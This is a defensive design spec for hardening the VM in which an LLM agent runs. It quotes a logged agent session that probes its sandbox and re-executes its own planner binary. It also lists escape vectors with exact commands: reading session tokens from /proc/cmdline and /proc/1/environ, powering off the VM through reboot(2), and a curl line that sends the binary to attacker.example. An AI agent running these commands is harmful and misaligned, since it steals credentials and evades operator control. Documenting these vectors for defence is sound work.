# Guest-agent jailbreak defense

> Normative reference for `INV-PLANNER-GUEST-AGENT-JAILBREAK-DEFENSE-01`.
>
> Sister docs:
> * `specs/v2/planner-pid1-only-exec.md` —
>   `INV-PLANNER-PID1-ONLY-EXEC-01` (iter72, defends against
>   re-exec of the planner binary inside its own VM).
> * `specs/v2/planner-ipc-idle-watchdog.md` —
>   `INV-PLANNER-IPC-IDLE-WATCHDOG-01` (iter72, defends against
>   wedged-VM stalls).
> * `specs/v2/airgap-architecture.md` — Path A3 egress chokepoint
>   that funnels every outbound TCP through the kernel-side
>   admission listener.

## 0. TL;DR

Even after `enforce_pid1_or_abort` (`INV-PLANNER-PID1-ONLY-EXEC-01`)
closed the most obvious vector — a child `raxis-executor` re-exec
inheriting the parent's vsock-listener bindings — an in-VM LLM
agent retains six independent **read** / **escape** vectors that
let it (a) recover kernel-stamped secrets like
`RAXIS_SESSION_TOKEN`, (b) read the planner binary out of `/init`
or `/proc/1/exe`, (c) issue `reboot(2)` to power-off the VM
out-of-band, (d) transitively escalate via a future setuid
binary on the rootfs, or (e) inherit secrets via
`Command::spawn`. This doc:

1. Lists each vector with the exact `bash -lc "…"` command an
   adversarial / curious agent would run to exercise it,
2. Explains why each vector matters (what the agent gains),
3. Names the defense (`raxis-planner-core::guest_init::
   harden_guest_for_agent` + `scrub_sensitive_env_for_agent`),
4. Shows the structured kernel-stderr log lines the defense emits
   so an operator can audit-replay each session and confirm the
   hardening fired.

The hardening is invoked from every planner-binary `main()`
(executor, orchestrator, reviewer) between
`init_pid1_a3_egress` / `mount_workspace_shares` and the tokio
runtime construction. The env scrub runs slightly later (inside
the `run()` async fn, after `BootContext::from_process` has
consumed the env vars into `ctx.env`).

## 1. Threat model

The adversary is the in-VM LLM agent itself (or a prompt that
steers it). The agent has:

* `BashTool` (`crates/planner-core/src/tools.rs::BashTool`) which
  spawns `bash -lc <command>` as a child of the planner process
  (i.e. PID 1) with full root uid, inheriting the planner's
  environment and filesystem view.
* Optional `SubprocessTool`s declared via
  `[[planners.*.custom_tools]]` in `policy.toml` —
  same spawn semantics.
* No direct vsock dialer (the agent has no `socket(AF_VSOCK)`
  binding in the model's tool API), but it does have `bash`,
  which can `socat`, `nc -U`, `python -c "import socket; socket.
  socket(socket.AF_VSOCK, …)"`, or any equivalent dialer if those
  binaries / runtimes are on `$PATH`.

The agent is **NOT** assumed to be a remote attacker with a
0-day on the kernel; the threat is the agent **misusing
authority it legitimately holds** to do things the operator did
not intend (steal another session's token, exfiltrate the
binary for offline analysis, abruptly halt the VM, …).

The kernel-side admission listener
(`INV-NETISO-A3-VSOCK-CHOKEPOINT-01`) and the per-session
admission token validation already bound the network surface;
this doc is about the **local in-VM** surface that the iter72
forensics revealed was wider than the original ground truth
(`enforce_pid1_or_abort` covers only the re-exec sub-vector).

## 1bis. Verbatim forensic record (iter72, May 17 2026 11:25 PT)

The hardening in this doc is not theoretical. It was written by
replaying the exact 32-turn LLM tool-call log captured from the
`dep-fetch-evidence` executor session that triggered the user-flagged
"trying to make it bind to the port" anomaly. The capture lives at
`${RAXIS_DATA_DIR}/llm-turns/dep-fetch-evidence.jsonl` (one line per
Anthropic `Messages` round-trip; per-line schema documented in
`crates/llm-turns`). The five tool-call slices below are pulled
verbatim from that file; the kernel-side ground-truth used to build
the defense surface is "whatever the agent was actually able to
observe."

The session was a **legitimate** task — the agent had no malicious
goal, it was diagnosing a DNS failure inside the executor VM — but
the diagnostic spiral exercised every read vector we now block.

### Turn 9 — agent inventories its own environment

The agent, frustrated by DNS failures, inventoried env vars
(deliberately excluding `TOKEN` to stay polite, but the underlying
env was wide-open):

```text
agent tool_use:  bash { command: "env | grep -i 'raxis\\|proxy\\|dns' | grep -v TOKEN" }
tool_result:
  exit_code: 0
  ----- stdout -----
  RAXIS_VIRTIOFS_MOUNTS=workspace:/workspace:rw,raxis-meta:/raxis-meta:ro
  RAXIS_KERNEL_VSOCK_LISTEN_PORT=1024
  RAXIS_SESSION_ID=81fe8fae-5f95-4e3a-b5ac-5a05ea37cf79
  RAXIS_TPROXY_KERNEL_TCP=127.0.0.1:60806
  RAXIS_PLANNER_TASK_PROMPT_PATH=/raxis-meta/task-prompt.txt
  RAXIS_PLANNER_MAX_TURNS=90
  RAXIS_PLANNER_KSB_PATH=/raxis-meta/ksb.json
```

Without the `grep -v TOKEN` filter the agent had imposed on itself,
`RAXIS_SESSION_TOKEN` would have been printed verbatim alongside
the kernel-side admission port (`RAXIS_AIRGAP_A3_ADMISSION_PORT`).
This is why `scrub_sensitive_env_for_agent` is the load-bearing
defense — every subsequent `bash -lc` child inherits this env via
`Command::spawn`, and the agent's grep filter is voluntary.

### Turn 13–14 — `/raxis-meta` surface

```text
agent tool_use:  bash { command: "ls -la /raxis-meta/ 2>/dev/null || echo 'Cannot access /raxis-meta'" }
tool_result:
  exit_code: 0
  ----- stdout -----
  total 20
  drwxr-xr-x 4 root root  128 May 17 18:41 .
  -rw-r--r-- 1 root root 5359 May 17 18:41 ksb.json
  -rw-r--r-- 1 root root 8916 May 17 18:41 task-prompt.txt
```

`/raxis-meta` is the read-only virtiofs share carrying the
operator-stamped task prompt and the kernel-emitted KSB. This is
intentional surface (the planner needs both to do its job) and is
out-of-scope for this hardening doc — but it sets the stage for
the next turn, where the agent generalizes to "let me list the
binary surface too."

### Turn 28 — agent discovers the planner binary

```text
agent reasoning:  "Let me try to understand the issue better. […]
                   Let me check if there's a way to trigger the DNS service:"
agent tool_use:   bash { command: "ls -la /usr/local/bin/ /usr/bin/ | grep -E 'dns|raxis' | head -20" }
tool_result:
  exit_code: 0
  ----- stdout -----
  lrwxrwxrwx  1 root root        8 May 17 18:41 dnsdomainname -> hostname
  -rwxr-xr-x  1 root root  6079712 May 17 18:41 raxis-executor
```

A 6 MB ELF binary at a `$PATH` location — the agent has it as a
candidate for the next move. This is the moment that made the
operator's earlier observation precise ("It's doing very weird
things like discovering it's own executable and trying to make it
bind to the port, should not be happening. It should not have access
to its own binary for jail brekas").

### Turn 29 — the actual jailbreak attempt

```text
agent reasoning:  "There's a `raxis-executor` binary! Let me check what it is:"
agent tool_use:   bash { command: "raxis-executor --help 2>&1 | head -30" }
tool_result:
  exit_code: 0
  ----- stdout -----
  {"level":"info","step":"planner-cmdline-env","role":"executor","outcome":"hydrated","applied":0,"skipped_already_set":8}
  {"level":"info","step":"planner-virtiofs-mount","role":"executor","outcome":"already","tag":"workspace","guest_path":"/workspace","read_only":false}
  {"level":"info","step":"planner-virtiofs-mount","role":"executor","outcome":"already","tag":"raxis-meta","guest_path":"/raxis-meta","read_only":true}
  {"level":"info","step":"cargo-net-offline-default","role":"executor","event":"preserved_existing","value":"true"}
  {"level":"info","step":"vsock-loopback-forwarder","role":"executor","outcome":"skipped","reason":"RAXIS_VSOCK_LOOPBACK_PLAN unset or empty"}
  {"level":"error","step":"airgap-a3-chokepoint","role":"executor","outcome":"bind-failed","reason":"Address in use (os error 98)"}
```

Several facts are load-bearing here:

1. **`applied=0, skipped_already_set=8`** — the child `raxis-executor`
   process did NOT need `/proc/cmdline` at all; it inherited 8
   `RAXIS_*` vars directly from its parent bash, which inherited
   them from PID 1. Masking `/proc/cmdline` alone (V1) is necessary
   but not sufficient — without the `scrub_sensitive_env_for_agent`
   pass (V6), the env-inheritance vector through `Command::spawn`
   stays open.
2. **`airgap-a3-chokepoint outcome=bind-failed`** — the only
   reason the re-exec did NOT cause two competing A3 chokepoints
   was port contention with PID 1. This is fragile: change the
   chokepoint to ephemeral per-invocation ports and the defense
   collapses. `INV-PLANNER-PID1-ONLY-EXEC-01` is the explicit
   defense against this re-exec class; the V3 hardening
   (`drop_cap_sys_boot_from_bounding_set`) and V4 hardening
   (`set_no_new_privs`) extend the same principle to other
   privilege-escalation paths.
3. **`bash -lc` returned `exit_code: 0`** because of the `2>&1 |
   head -30` redirect — the underlying planner exit code (64,
   `BOOT_ERR_ISOLATION_UNAVAILABLE`, emitted by
   `enforce_pid1_or_abort` in iter72) was swallowed by `head`.
   This means the agent's bash success/failure cannot be used as a
   trust signal; the defenses MUST be effective independent of
   what the agent observes.

### Why this doc lists six vectors, not one

The iter72 incident demonstrated **two distinct read primitives**
(env via `Command::spawn`, env via `/proc/cmdline`) and **one
escape primitive** (re-exec of `/usr/local/bin/raxis-executor`).
Extrapolating that surface with the kernel's actual capability
inventory (root uid, `CAP_SYS_BOOT` ambient, full procfs visible)
gives the six vectors enumerated in §2 — each one was either
directly observed in the iter72 capture or is the natural
generalization of an observed read primitive (e.g. `/proc/1/environ`
is the same data the agent recovered via `env | grep RAXIS_`, but
from a different process; therefore both vectors need defenses).

## 2. Vector taxonomy + replay logs

### 2.1 V1 — `/proc/cmdline` exposes the kernel-stamped env token

**What the agent does:**

```bash
$ bash -lc 'cat /proc/cmdline'
console=ttyAMA0 root=ram0 raxis.envb64=UkFYSVNfU0VTU0lPTl9UT0tFTj1zZWNyZXQK panic=1 init=/init
```

The `raxis.envb64=…` token is the base64-encoded env block the
AVF substrate folds onto the kernel cmdline (the AVF surface
exposes no `Command::env` analogue;
see `crates/isolation-apple-vz/src/config.rs::translate`).
Decoding it recovers every `RAXIS_*` variable the kernel
stamped:

```bash
$ bash -lc 'cat /proc/cmdline | tr " " "\n" | grep ^raxis.envb64= | cut -d= -f2- | base64 -d | tr "\0" "\n"'
RAXIS_SESSION_TOKEN=eyJhbGciOi…
RAXIS_KERNEL_VSOCK_LISTEN_PORT=5380
RAXIS_PLANNER_TASK_PROMPT_PATH=/raxis/prompt.txt
RAXIS_AIRGAP_A3_HOST_CID=2
RAXIS_AIRGAP_A3_ADMISSION_PORT=5380
RAXIS_AIRGAP_A3_TUNNEL_PORT=5381
…
```

**Why it matters:**

* `RAXIS_SESSION_TOKEN` is the credential the kernel-side IPC
  handler uses to authorise `IntentRequest`s on the parent's
  behalf. With the token in hand, an agent process that can
  open a vsock to `(VMADDR_CID_HOST,
  RAXIS_KERNEL_VSOCK_LISTEN_PORT)` can submit intents
  pretending to be the legitimate planner. Replay protection
  (`accept_envelope_and_advance_sequence`) bounds the damage —
  the agent doesn't know the current `sequence_number` and must
  race the legitimate planner — but the kernel-side
  audit chain still records every attempt, and a tight race
  could win one intent admission.
* `RAXIS_PLANNER_TASK_PROMPT_PATH` leaks the operator's
  secret prompt. Some operators bake credentials / context into
  the task prompt; the agent can read them.
* `RAXIS_AIRGAP_A3_*` leak the kernel-side admission +
  tunnel ports, letting the agent skip the in-guest tproxy and
  go direct to the kernel admission listener with a stolen
  token (still gated by the admission policy, but the audit
  trail no longer reflects the in-guest tproxy's `peek` /
  `SO_ORIGINAL_DST` enrichment).

**Defense:** `harden_guest_for_agent` →
`linux_harden::mask_proc_cmdline` bind-mounts `/dev/null` over
`/proc/cmdline`. Reads return EOF regardless of the caller's
uid. PID 1 has already hydrated its env BEFORE the bind mount
fires (the hardening sweep runs AFTER
`hydrate_from_proc_cmdline`), so masking is lossless for the
legitimate path.

**Log line confirming defense fired:**

```text
{"level":"info","step":"guest-harden","event":"proc_cmdline_masked"}
```

**Operator verification:** after a successful boot, an agent
running `cat /proc/cmdline` observes:

```text
(empty — zero bytes returned)
```

### 2.2 V2 — `/proc/1/environ` echoes the hydrated env

**What the agent does:**

```bash
$ bash -lc 'cat /proc/1/environ | tr "\0" "\n" | grep ^RAXIS_'
RAXIS_SESSION_TOKEN=eyJhbGciOi…
RAXIS_KERNEL_VSOCK_LISTEN_PORT=5380
…
```

Linux's `/proc/<pid>/environ` is readable by callers whose uid
matches the target process's uid (or with `CAP_SYS_PTRACE`).
PID 1 runs as root inside the VM; the agent's `bash` runs as
root too; the read succeeds.

**Why it matters:** even if `/proc/cmdline` is masked (V1
defense), the hydrated env block lives in PID 1's memory and
surfaces through `/proc/1/environ`. The agent recovers the
same secrets.

**Defense:** `harden_guest_for_agent` →
`linux_harden::set_pid1_undumpable` issues
`prctl(PR_SET_DUMPABLE, SUID_DUMP_DISABLE, 0, 0, 0)`. The
kernel responds by chmod'ing the per-pid procfs entries
`0500 root:root` and dropping the dump flag for **every
future child** (the flag is inherited across `fork`/`clone`).
The agent's `bash` is itself non-dumpable, so even
`cat /proc/self/environ` (in the agent's own process) returns
EPERM unless the caller has `CAP_SYS_PTRACE`. Combined with
the `CAP_SYS_BOOT` drop (V3) and the planned future drop of
ambient capabilities, this defangs the env-read vector for
every descendant of PID 1.

**Log line confirming defense fired:**

```text
{"level":"info","step":"guest-harden","event":"pr_set_dumpable_disabled"}
```

**Operator verification:** after a successful boot, an agent
running `cat /proc/1/environ` observes:

```text
cat: /proc/1/environ: Permission denied
```

…and `cat /proc/self/environ`:

```text
cat: /proc/self/environ: Permission denied
```

### 2.3 V3 — Planner binary is world-readable at `/init` / `/usr/local/bin/raxis-*`

**What the agent does:**

```bash
# Method 1: read the on-disk /init
$ bash -lc 'wc -c /init'
8453928 /init

# Method 2: read the /usr/local/bin/ copy
$ bash -lc 'wc -c /usr/local/bin/raxis-executor'
8453928 /usr/local/bin/raxis-executor

# Method 3: read /proc/1/exe (in-kernel exe descriptor)
$ bash -lc 'wc -c /proc/1/exe'
8453928 /proc/1/exe

# Method 4: exfiltrate via the tproxy (if the agent's policy
# allows ANY outbound TCP host, e.g. github.com over the
# `domain-network` tool)
$ bash -lc 'base64 /init | curl --data-binary @- https://attacker.example/payload'
```

**Why it matters:** the planner binary contains:

* Embedded prompt templates (`crates/planner-core/src/driver.
  rs` ships role-specific system prompts as `const &str`).
* The exact intent / push wire shape (bincode envelope sizes,
  field ordering).
* The list of compile-time tool registrations.
* Branding strings, internal struct names — useful for an
  attacker reconstructing the kernel-IPC protocol from
  scratch.

The agent does NOT gain code-execution from reading the binary
(it cannot re-exec it — V0 / `enforce_pid1_or_abort`), but it
gains intelligence that lowers the bar for future attacks.

**Defense:** `harden_guest_for_agent` →
`linux_harden::mask_planner_binaries` iterates over
`PLANNER_BINARY_PATHS_TO_MASK` (`/init`,
`/usr/local/bin/raxis-{executor,orchestrator,reviewer}`,
`/usr/local/bin/raxis-verifier-no-secrets`) and bind-mounts
`/dev/null` over each that exists. Methods 1 and 2 both observe
zero-byte files post-mount. Method 3 (`/proc/1/exe`) is a
symlink to the in-kernel exe descriptor, which the bind-mount
does not affect — but is gated by the `PR_SET_DUMPABLE=0`
flag from V2, so the agent's bash sees EPERM on
`open(/proc/1/exe)` after the dumpable flag clears.

**Log line confirming defense fired:**

```text
{"level":"info","step":"guest-harden","event":"planner_binaries_masked","masked":2,"already":0,"missing":3,"errors":0}
```

(The exact `masked` / `missing` counts depend on which role's
binary the substrate stamped into the rootfs; the executor
image ships only `/init` + `/usr/local/bin/raxis-executor`,
leaving the orchestrator + reviewer + verifier paths under
`missing`.)

**Operator verification:**

```bash
$ bash -lc 'wc -c /init /usr/local/bin/raxis-executor'
0 /init
0 /usr/local/bin/raxis-executor
0 total

$ bash -lc 'cat /proc/1/exe'
cat: /proc/1/exe: Permission denied
```

### 2.4 V4 — `reboot(2)` is a `CAP_SYS_BOOT` operation

**What the agent does:**

```bash
# Method 1: `reboot` binary (busybox)
$ bash -lc 'reboot'

# Method 2: `shutdown` (if available)
$ bash -lc 'shutdown -h now'

# Method 3: direct syscall via python (if python is in PATH)
$ bash -lc 'python3 -c "import ctypes; ctypes.CDLL(\"libc.so.6\").reboot(0x4321FEDC)"'
#                                                                ^^^^^^^^^^^^ LINUX_REBOOT_CMD_POWER_OFF

# Method 4: SIGTERM PID 1 (almost always fails since PID 1
# has no SIGTERM handler installed for non-init signals, but
# would shut down via the init signal handler if the planner
# ever wires one).
$ bash -lc 'kill -SIGTERM 1'
```

**Why it matters:** the agent shuts down the entire VM
out-of-band. The substrate observes a clean power-off, and the
kernel's `drive_planner_stream` returns EOF without a
`PlannerExitNotice`. The Mode-B premature-exit synthesiser
(`session_spawn_orchestrator`) names the gap explicitly
(`"executor VM exited via clean EOF without a
PlannerExitNotice — likely SIGKILL / OOM / panic before exit
cleanup"`), but the kernel cannot tell **the planner self-
exited cleanly** vs **the agent killed the VM**. Both produce
the same audit-chain footprint. An adversarial agent could use
this to:

* Force the orchestrator to mark the task as a transient
  failure and retry it (the retry budget is bounded by
  `policy.toml::[respawn]`, so a single VM kill is not
  catastrophic, but it costs wall-clock and tokens).
* Race the kernel-side audit emission: if the VM dies during a
  paired-write (e.g. between
  `SessionVmSpawned` and the in-tx commit of the spawn row),
  the audit chain may surface a chain-integrity warning that
  the operator has to triage manually.

**Defense:** `harden_guest_for_agent` →
`linux_harden::drop_cap_sys_boot_from_bounding_set` issues
`prctl(PR_CAPBSET_DROP, CAP_SYS_BOOT, 0, 0, 0)`. The kernel
drops `CAP_SYS_BOOT` from the **bounding set** — the upper
bound on capabilities a child can acquire across `execve(2)`.
PID 1 itself retains the cap in its **effective + permitted**
sets (so [`shutdown_or_exit`] continues to issue
`reboot(LINUX_REBOOT_CMD_POWER_OFF)` on clean terminal exit),
but every `execve` triggered by the agent's bash tool runs
under the bounding-set-intersected capability set — i.e. with
no `CAP_SYS_BOOT`. The agent's `reboot` / `shutdown` calls
return EPERM.

**Log line confirming defense fired:**

```text
{"level":"info","step":"guest-harden","event":"cap_sys_boot_dropped_from_bounding_set"}
```

**Operator verification:**

```bash
$ bash -lc 'reboot'
reboot: must be superuser
$ bash -lc 'python3 -c "import ctypes; print(ctypes.CDLL(\"libc.so.6\").reboot(0x4321FEDC))"'
-1
# (`reboot(2)` returned `EPERM` — exit code -1 from python's
# return-value bridge).
```

### 2.5 V5 — Future setuid binary on the rootfs

**What the agent does:**

```bash
# Hypothetical — the canonical image does NOT today ship a
# setuid binary, but a future toolchain addition (say a setuid
# `ping` to support an icmp-based health-check tool) would
# open this vector.
$ bash -lc 'cp /bin/some-setuid-binary /tmp/x && /tmp/x …'
```

**Why it matters:** if the rootfs ever ships a setuid binary,
the agent could exec it to acquire host-uid privileges that
the planner had at boot but explicitly dropped (e.g. with the
future ambient-cap drop sweep).

**Defense:** `harden_guest_for_agent` →
`linux_harden::set_no_new_privs` issues
`prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)`. Once set, the kernel
guarantees that no subsequent `execve(2)` (in this process
or any descendant) can grant privileges that were not held at
the time of the prctl. The flag is inherited across
`fork`/`clone`/`execve` and **cannot be unset**.

**Log line confirming defense fired:**

```text
{"level":"info","step":"guest-harden","event":"pr_set_no_new_privs_enabled"}
```

**Operator verification:** if a setuid binary ever lands on
the rootfs and the agent execs it, the suid bit is silently
ignored:

```bash
$ bash -lc 'ls -l /bin/sudo; sudo -u root id'
-rwsr-xr-x 1 root root 159944 Apr  1 12:00 /bin/sudo
sudo: effective uid is not 0, is /etc/sudoers.d or /etc/sudoers misconfigured?
# (sudo refuses to drop+regain privs because `NO_NEW_PRIVS` is set.)
```

### 2.6 V6 — Sensitive env vars in `Command::spawn` inheritance

**What the agent does:**

```bash
$ bash -lc 'env | grep ^RAXIS_'
RAXIS_SESSION_TOKEN=eyJhbGciOi…
RAXIS_KERNEL_VSOCK_LISTEN_PORT=5380
…
```

Even after `/proc/cmdline` is masked (V1) and `/proc/1/environ`
is undumpable (V2), the agent's `bash` process is itself
spawned by `tokio::process::Command::new("bash").spawn()` in
`BashTool::execute`. `Command::spawn` by default inherits the
parent process's environment. If RAXIS_* are still in the
planner's process env at the time `Command::spawn` is invoked,
they propagate into the bash child unchanged — defeating V2.

**Why it matters:** this is the canonical token-recovery path
for an agent. It needs nothing but `bash -lc 'env'`.

**Defense:** `scrub_sensitive_env_for_agent` is called inside
each planner-binary's `run()` async fn AFTER
`BootContext::from_process` has consumed the env vars into
`ctx.env` and BEFORE `run_role_session` enters the dispatch
loop. The function iterates over `SENSITIVE_ENV_VARS_TO_SCRUB`
(`RAXIS_AIRGAP_A3_*`, `RAXIS_KERNEL_VSOCK_LISTEN_PORT`,
`RAXIS_PLANNER_TASK_PROMPT[_PATH]`, `RAXIS_SESSION_TOKEN`) and
removes each from the process environment via
`std::env::remove_var`.

Critical ordering invariant: the in-guest tproxy +
DNS-stub-spawning tasks (`activate_airgap_a3_chokepoint` in
`crates/planner-executor/src/main.rs`) MUST `.clone()` the
session token into their `tokio::spawn` task bodies BEFORE the
scrub fires. They do — the spawn order is fixed at the
binary-`main()` callsite. The scrub then runs as the next
statement after the spawn awaits return, so by the time the
agent's first `BashTool` dispatch fires, the env is clean and
the in-VM tproxy / DNS-stub still hold their session-token
references via task-local capture.

**Log line confirming defense fired:**

```text
{"level":"info","step":"guest-harden","event":"sensitive_env_scrubbed","scrubbed":7,"already_unset":0,"invariant":"INV-PLANNER-GUEST-AGENT-JAILBREAK-DEFENSE-01"}
```

**Operator verification:**

```bash
$ bash -lc 'env | grep ^RAXIS_'
(no output — every RAXIS_* var listed in
`SENSITIVE_ENV_VARS_TO_SCRUB` is absent from the agent's env.)
```

(Note: `RAXIS_SESSION_ID` is intentionally NOT scrubbed — it
is the kernel-side correlator the agent's tool dispatch needs
for audit logging; the scrub list pins only secrets and
network-discovery values.)

## 3. End-to-end log walkthrough

A successful executor-VM boot with the hardening enabled
produces the following sequence on the substrate's console
log (`<data_dir>/guests/<session_id>/console.log`):

```text
{"level":"info","step":"guest-init","event":"mount_ok","target":"/proc","fs_type":"proc"}
{"level":"info","step":"guest-init","event":"mount_ok","target":"/sys","fs_type":"sysfs"}
{"level":"info","step":"guest-init","event":"mount_ok","target":"/tmp","fs_type":"tmpfs"}
{"level":"info","step":"guest-init","event":"mount_ok","target":"/dev","fs_type":"devtmpfs"}
{"level":"info","step":"guest-init","event":"stdio_attached_to_console","version":"0.1.0"}
{"level":"info","step":"guest-init","event":"loopback_up"}
{"level":"info","step":"planner-cmdline-env","role":"executor","outcome":"hydrated","applied":11,"skipped_already_set":0}
{"level":"info","step":"planner-virtiofs-mount","role":"executor","outcome":"ok","tag":"workspace","guest_path":"/workspace","read_only":false}
{"level":"info","step":"cargo-net-offline-default","role":"executor","event":"defaulted","value":"true"}
{"level":"info","step":"guest-init-a3","event":"ipv6_disabled","scope":"all"}
{"level":"info","step":"guest-init-a3","event":"ipv6_disabled","scope":"default"}
{"level":"info","step":"guest-init-a3","event":"ipv6_disabled","scope":"lo"}
{"level":"info","step":"guest-init-a3","event":"resolv_conf_pointed_at_stub"}
{"level":"info","step":"guest-init-a3","event":"iptables_redirect_installed","binary":"iptables-nft","tproxy_port":3129}
{"level":"info","step":"guest-harden","event":"proc_cmdline_masked"}
{"level":"info","step":"guest-harden","event":"pr_set_dumpable_disabled"}
{"level":"info","step":"guest-harden","event":"planner_binaries_masked","masked":2,"already":0,"missing":3,"errors":0}
{"level":"info","step":"guest-harden","event":"cap_sys_boot_dropped_from_bounding_set"}
{"level":"info","step":"guest-harden","event":"pr_set_no_new_privs_enabled"}
{"level":"info","step":"vsock-loopback-forwarder","role":"executor","outcome":"activated","entries":2}
{"level":"info","step":"airgap-a3-chokepoint","role":"executor","outcome":"activated","host_cid":2,"admission_port":5380,"tunnel_port":5381}
{"level":"info","step":"guest-harden","event":"sensitive_env_scrubbed","scrubbed":7,"already_unset":0,"invariant":"INV-PLANNER-GUEST-AGENT-JAILBREAK-DEFENSE-01"}
{"level":"info","step":"planner-boot","role":"executor",…}
```

The five `step:"guest-harden"` lines are the proof that each
of V1–V5 fired; the `sensitive_env_scrubbed` line is the proof
that V6 fired. An operator triaging a session can `grep
'"guest-harden"' console.log` to confirm the hardening engaged
before the first model dispatch.

## 4. Defense-in-depth layering

```text
┌──────────────────────────────────────────────────────────────────────┐
│                        Kernel-side defenses                          │
│ ┌──────────────────────────┐  ┌──────────────────────────────────┐  │
│ │ INV-NETISO-A3-VSOCK-     │  │ INV-PLANNER-IPC-IDLE-WATCHDOG-01 │  │
│ │ CHOKEPOINT-01            │  │ (drive_planner_stream timeout)   │  │
│ │ (kernel admission        │  │                                  │  │
│ │  policy, session-token   │  │ Forcibly terminates a wedged VM  │  │
│ │  validation, audit)      │  │ after 900s of IPC silence.       │  │
│ └──────────────────────────┘  └──────────────────────────────────┘  │
├──────────────────────────────────────────────────────────────────────┤
│                        Guest-side defenses                           │
│ ┌──────────────────────────┐  ┌──────────────────────────────────┐  │
│ │ INV-PLANNER-PID1-ONLY-   │  │ INV-PLANNER-GUEST-AGENT-         │  │
│ │ EXEC-01 (iter72)         │  │ JAILBREAK-DEFENSE-01 (this doc)  │  │
│ │ Refuses re-exec from a   │  │                                  │  │
│ │ child process of the     │  │ V1: /proc/cmdline masked         │  │
│ │ planner binary.          │  │ V2: pr_set_dumpable disabled     │  │
│ │                          │  │ V3: planner binaries masked      │  │
│ │ Closes vector            │  │ V4: CAP_SYS_BOOT dropped from    │  │
│ │ "agent invokes           │  │     bounding set                 │  │
│ │  raxis-executor as       │  │ V5: PR_SET_NO_NEW_PRIVS set      │  │
│ │  child"                  │  │ V6: RAXIS_* env scrubbed from    │  │
│ │                          │  │     process env pre-dispatch     │  │
│ └──────────────────────────┘  └──────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────┘
```

Each layer is independent: V6 (env scrub) defangs the most
common token-recovery path (`bash -lc 'env'`); V1+V2 defang
the procfs alternates; V4 prevents the agent from
out-of-band-killing the VM regardless of what V1–V3 leaked;
V5 future-proofs against setuid drift in the canonical image.

## 5. What this doc does NOT cover (future work)

* **Network namespace separation for the agent.** The cleanest
  defense against the agent dialing the kernel-IPC vsock
  channel directly (even with a stolen token) is to move
  agent processes into a child network namespace without the
  AF_VSOCK device. This requires a non-trivial restructure of
  the planner's `BashTool` / `SubprocessTool` to issue
  `clone(CLONE_NEWNET)` per dispatch — out of scope for this
  iteration but tracked in the iter72 forensics backlog.
* **Non-root agent uid.** Dropping the agent's bash process
  to a non-root uid (e.g. `nobody`) would close the
  `/proc/1/{environ,exe}` vector cleanly regardless of the
  `PR_SET_DUMPABLE` flag (uid mismatch → procfs deny). The
  blocker today is that several executor tools
  (`git_commit`, `cargo build`, custom `apt-get install`
  recipes) genuinely need root in the workspace; a per-tool
  privilege ladder is the right answer but would touch every
  tool's `execute` impl.
* **Seccomp filter for the agent.** A targeted seccomp BPF
  filter on the agent's `bash` (denying `reboot(2)`,
  `init_module(2)`, `mount(2)`, `pivot_root(2)`, …) would
  layer on top of the `CAP_SYS_BOOT` drop and harden against
  capability-set leaks if the canonical image ever ships
  ambient caps. Tracked separately.

## 6. Invariants

`INV-PLANNER-GUEST-AGENT-JAILBREAK-DEFENSE-01` — Every
planner-binary `main()` MUST invoke
`raxis_planner_core::harden_guest_for_agent` between
`init_pid1_a3_egress` (or `mount_workspace_shares` for the
non-egress orchestrator / reviewer) and the tokio runtime
construction, AND
`raxis_planner_core::scrub_sensitive_env_for_agent` inside
its `run()` async fn between `BootContext::from_process` and
`run_role_session`. Violation surfaces in the substrate
console log as the absence of any `step:"guest-harden"`
JSON line preceding the first `planner-boot` line; the
verifier reviewer is expected to flag the gap.

## 7. Code references

* `crates/planner-core/src/guest_init.rs::
  harden_guest_for_agent` — orchestrator entry point.
* `crates/planner-core/src/guest_init.rs::
  scrub_sensitive_env_for_agent` — env-scrub helper.
* `crates/planner-core/src/guest_init.rs::linux_harden::*` —
  individual defense impls.
* `crates/planner-core/src/guest_init.rs::
  PLANNER_BINARY_PATHS_TO_MASK` — the binary mask list.
* `crates/planner-core/src/guest_init.rs::
  SENSITIVE_ENV_VARS_TO_SCRUB` — the env scrub list.
* `crates/planner-executor/src/main.rs::main` — executor
  call sites.
* `crates/planner-orchestrator/src/main.rs::main` —
  orchestrator call sites.
* `crates/planner-reviewer/src/main.rs::main` — reviewer
  call sites.
